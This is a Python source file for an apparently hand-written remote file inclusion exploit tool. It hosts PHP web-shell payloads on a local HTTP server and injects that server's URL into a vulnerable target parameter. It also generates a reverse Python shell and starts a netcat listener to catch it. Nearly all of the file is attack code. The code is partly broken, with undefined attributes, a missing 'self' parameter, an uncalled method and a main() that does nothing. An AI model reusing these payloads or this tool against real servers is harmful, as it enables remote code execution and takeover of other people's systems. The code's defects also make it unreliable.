#!/usr/bin/env python3
"""
RFI exploiter
"""
import requests, socket, os, threading, sys
from shellgen import shellgen
import argparse


class PayloadServer():
    def __init__(self, address='0.0.0.0',port=8000):
        self.address = address
        self.port = port
        self.client_count = 10
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bindings = []
        
    def start(self):
        pass
    def add_payload(self,method='GET',endpoint='/',payload='Hello World!'):
        self.bindings.append({'method':method,'endpoint':endpoint,'payload':payload})
    # Private methods
    def _server_thread(self):
        self.server.bind((self.address, self.port))
        self.server.listen(self.client_count)
        print("Listening on port: "+str(self.port))
        while True:
            conn, addr = self.server.accept()
            data = conn.recv(1024)
            if not data:
                conn.close()
                print(f"[x] Error occurred while serving data!")            
            method,path = self._get_request_data(data.decode())
            ep = self._get_endpoint(method,path)
            if ep != None:
                http_response_string = f"HTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.8.5\nDate: Thu, 20 May 2021 12:16:41 GMT\nContent-type: application/octet-stream\nContent-Length: {len(ep['payload'])}\nLast-Modified: Thu, 20 May 2021 12:16:17 GMT\n\nPAYLOAD"
                http_response_string = http_response_string.replace('PAYLOAD',ep['payload'])                
                conn.send(http_response_string.encode())
                conn.close()
            else:
                conn.close()
    def _get_request_data(self,data):
        # GET /jquery-2.2.2.min.js HTTP/2
        rows = data.split('\r\n')
        d = rows[0].split(' ',2)
        method = d[0]
        path = d[1]
        return method,path
    def _get_endpoint(self,method,endpoint):
        for e in self.bindings:
            if e['method'] == method and e['endpoint'] == endpoint:
                return e
        return None

# RFI Exploiter class
class RFIExploiter():
    def __init__(self,url='',srv_address='0.0.0.0',srv_port=8000):
        self.url = url
        self.srv_address = srv_address
        self.srv_port = srv_port
        self.payload = ''
        self.lport = 9001
        self.lhost = '127.0.0.1'
        self.payloads = [{'name':'php_system','cmd':'<?php system(PAYLOAD); ?>'},
                         {'name':'php_exec_get','cmd':'<?php system(GET["cmd"]); ?>'},
                         {'name':'php_exec_request','cmd':'<?php system($_REQUEST["cmd"]) ?>'}]
        
        
    
    
    # public classes
    # Application setters
    def set_url(self,url):
        self.url = url
    def set_srv_address(self,address):
        self.srv_address = address
    def set_srv_port(self,port):
        self.srv_port = port
    def set_lhost(self,lhost):
        self.lhost = lhost
    def set_lport(self,lport):
        self.lport = lport
        
    # Application Getters
    def get_url(self):
        return self.url
    def get_srv_address(self):
        return self.srv_address
    def get_srv_port():
        return self.srv_port
    def get_lhost(self):
        return self.lhost
    def get_lport(self):
        return self.lport
    
    def exploit(self):
        if self.url != '' and self._check_rfi_in_url(self.url):
            
            shell = shellgen()
            print(f"[+] Generating payload to serve it..")
            pload = shell.generate_shell('reverse_python',lport=self.lport,lhost=self.lhost)
            pload = pload.replace("\'","\\'")
            pload = f"<?php system('{pload}'); ?>"
            serve_thread = threading.Thread(target=self._serve_content, args=(pload,))
            serve_thread.start()
            print("[+] Triggering the vulnerability...")
            vuln_url = self._build_url_payload()
            response = requests.get(vuln_url)
            #print(response.status_code)
            # joining the dead thread
            serve_thread.join()
        else:
            print("[!] URL cannot be null, and must be contains an RFI word!")
            
            
    def read_custom_payload(self,path):
        """
        Read Custom payload from the PC and serve it..
        """
        if os.path.isfile(path):
            exp_data = ''
            with open(path,'r') as f:
                exp_data = f.read()
            return exp_data
        else:
            print(f'The given file {path} is not exists!')
    def os_command(self,payload='php_exec_get',command='uname -a',interactive=False):
        if self.url != '' and self._check_rfi_in_url(self.url):
            pload = self._get_payload(payload)
            if pload != None:
                # Serving a payload with a thread
                serve_thread = threading.Thread(target=self._serve_content, args=(pload,))
                serve_thread.start()
                # Building the Truiggering URL
                vuln_url = self._build_url_payload()
                # Send GET request
                response = requests.get(vuln_url)
                if response.status_code == 200:
                    print(response.text)
                else:
                    print(f"[!] Warning! Status Code: {str(response.status_code)}")
        
    def reverse_shell(self):
        pass
    def test_rfi(self):
        """
        Testing the RFI vulnerability
        """
        pass
    
    
    # private classes
    def _check_rfi_in_url(self,url):
        if "RFI" in url:
            return True
        else:
            return False
    def _serve_content(self,payload):
        try:
            http_response_string = f"HTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.8.5\nDate: Thu, 20 May 2021 12:16:41 GMT\nContent-type: application/octet-stream\nContent-Length: {len(payload)}\nLast-Modified: Thu, 20 May 2021 12:16:17 GMT\n\nPAYLOAD"
            http_response_string = http_response_string.replace('PAYLOAD',payload)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                print(f"[+] Serving payload on {self.srv_address}:{str(self.srv_port)}")
                s.bind((self.srv_address, self.srv_port))
                s.listen()
                conn, addr = s.accept()
                data = conn.recv(1024)
                if not data:
                    conn.close()
                    print(f"[x] Error occurred while serving data!")
                conn.send(http_response_string.encode())
                conn.close()
                print(f"[+] Payload hit by the remote server!")
        except Exception as e:
            print(e)
    def _build_url_payload(self):
        if self._rfi_in_url:
            u = f'http://{self.lhost}:{self.srv_port}/almafa.php'
            rfi_url = self.url.replace('RFI',u)
            return rfi_url
        else:
            print('The RFI word is not specified in the target URL!')
        
    def _run_listener(self):
        cmd= f"nc -l {self.srv_address} -vnp {str(self.lport)}"
        os.system(cmd)
    def _generate_payload(self):
        shell = shellgen()
        print(f"[+] Generating payload to serve it..")
        pload = shell.generate_shell('reverse_python',lport=self.lport,lhost=self.lhost)
        with open('almafa.php','w')as f:
            pass
        
    
    
    def _get_payload(self, name):
        for p in self.payloads:
            if p['name'].lower == name.lower():
                return p
        return None
    
"""    
r = RFIExploiter('http://192.168.60.79/rfi.php?path=RFI')
r.srv_port = 8001
r.lhost = '192.168.60.52'
r.lport = 9001
r.exploit()
"""
def parse_parameters():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',help='The target vulnerable URL')
    parser.add_argument('--os-shell',dest='shell',action='store_true',help='Get OS shell from the target')
    parser.add_argument('-i','--interactive',dest='interactive',help='Interactive shell in Command execution')
    parser.add_argument('-c','--cmd',dest='cmd',help='Run specified command in the target')
    parser.add_argument('-p','--payload',dest='payload',help='Run this payload on the target')
    parser.add_argument('-f','--file',dest='file',help='The file which can contains a payload, and serve it')
    parser.add_argument('-H','--srv-host',dest='srvhost',help='The HTTP server address for hosting the payload')
    parser.add_argument('-P','--srv-port',dest='srvport',help='The port for the HTTP server for losten on')
    parser.add_argument('--lhost',dest='lhost',help='The local address to listen on for reverse connection')
    parser.add_argument('--lport',dest='lport',help='The local port to listen on for reverse connection')
        
    args = parser.parse_args()
    return args

def main():
    # Parsing the given parameters
    args = parse_parameters()
    interactive = False
    os_shell = False
    commandexec = False
    
    # Setting up the given parameters
    if args.url: 
        url = args.url
    else: 
        print("[!] Please specify an URL")
        sys.exit(1)
    if args.shell: os_shell = True
    if args.cmd: commandexec = True
    if args.payload: payload = args.payload
    if args.file: exploit_file = args.file
    if args.srvhost: srvhost = args.srvhost
    if args.srvport: srvport = args.srvport
    if args.lport: lport = args.lport
    if args.lhost: lhost = args.lhost 
    if args.interactive: interactive = args.interactive
    
    if os_shell and commandexec:
        print('[x] OS Shell and Command execution are active. You cannot use both of them.')
    
    
    
    
    
if __name__ == '__main__':
    main()
    
    
ps = PayloadServer()
ps.port = 8004
ps.add_payload('GET','/hulala.php','mukodik ez a cucc!juheeee')
ps._server_thread()